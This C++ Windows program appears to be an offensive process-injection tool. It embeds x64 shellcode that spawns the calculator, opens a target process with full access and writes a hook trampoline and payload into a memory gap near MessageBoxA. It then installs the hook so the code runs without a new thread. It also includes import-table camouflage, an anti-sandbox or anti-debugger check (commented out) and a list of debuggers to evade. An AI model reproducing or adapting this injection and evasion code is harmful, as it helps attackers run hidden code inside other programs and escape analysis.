#include "Windows.h"
#include <tlhelp32.h>
#include "API/headers/api.h"
#include "utils/headers/antianalysis.h"
#include "../headers/payload.h"


#define TARGET_FUNC	"MessageBoxA"
#define TARGET_DLL	"USER32"

// spawn calculator
unsigned char rawData[106] = {
		0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
		0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
		0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
		0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
		0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
		0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
		0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
		0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
		0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};

unsigned char g_HookShellCode[63] = {
	0x5B, 0x48, 0x83, 0xEB, 0x04, 0x48, 0x83, 0xEB, 0x01, 0x53, 0x51,
	0x52, 0x41, 0x51, 0x41, 0x50, 0x41, 0x53, 0x41, 0x52, 0x48, 0xB9,
	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89, 0x0B,
	0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0xEC, 0x20, 0xE8, 0x11, 0x00,
	0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5A, 0x41, 0x5B, 0x41,
	0x58, 0x41, 0x59, 0x5A, 0x59, 0x5B, 0xFF, 0xE3
};

void ExitProgram(const char* message)
{
	MessageBoxA(NULL, message, "error", MB_ICONWARNING);
	ExitProcess(-1);
}


DWORD GetPID(const char* process, API::API_ACCESS &api) {
	DWORD processId = 0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32 processEntry;
		processEntry.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(snapshot, &processEntry)) {
			do {
				if (strcmp(process, processEntry.szExeFile) == 0) {
					processId = processEntry.th32ProcessID;
					break;
				}
			} while (Process32Next(snapshot, &processEntry));
		}
		CloseHandle(snapshot);
	}
	return processId;
}

/*

WCHAR* debuggers[] = {
		L"x64dbg.exe",                 
		L"ida.exe",                    
		L"ida64.exe",                  
		L"VsDebugConsole.exe",         
		L"msvsmon.exe"                 
};
*/


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	AntiAnalysis debug;
	
	ULONG_PTR uAddress = NULL;

	auto& resolver = API::APIResolver::GetInstance();

	resolver.IATCamo();
	resolver.LoadModules();
	resolver.ResolveFunctions();

	auto resolved	  = resolver.GetAPIAccess();
	//debug.IsBeingWatched(resolver); // Nuke self if in sandbox or debugger

	HMODULE hModule = GetModuleHandleA(TARGET_DLL);

	if (hModule == INVALID_HANDLE_VALUE)
	{
		MessageBoxA(NULL, "invalid module handle", "error", MB_ICONWARNING);
		return -1;
	}
	
	auto pFunctionToHook = GetProcAddress(hModule, TARGET_FUNC);

	if (!pFunctionToHook)
	{
		MessageBoxA(NULL, "couldn't get address of function", "error", MB_ICONWARNING);
		return -1;
	}


	PatchHook(pFunctionToHook);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, GetPID("payload.exe", resolved));

	if (hProcess == INVALID_HANDLE_VALUE)
		ExitProgram("failed to get a handle to the process");

	if (!LocateMemoryGap(hProcess, &uAddress, reinterpret_cast<ULONG_PTR>(pFunctionToHook), sizeof(rawData) + sizeof(g_HookShellCode), resolved))
		ExitProgram("failed to find a memory gap");


	if (!WritePayloadBuffer(hProcess, uAddress, (ULONG_PTR)g_HookShellCode, sizeof(g_HookShellCode), (ULONG_PTR)rawData, sizeof(rawData)))
		ExitProgram("failed to write payload buffer");


	if (!InstallHook(hProcess, pFunctionToHook, reinterpret_cast<void*>(uAddress)))
		ExitProgram("failed to install hook");
	
	MessageBoxA(NULL, "stage 1 complete", "error", MB_ICONWARNING);


	return 0;
} 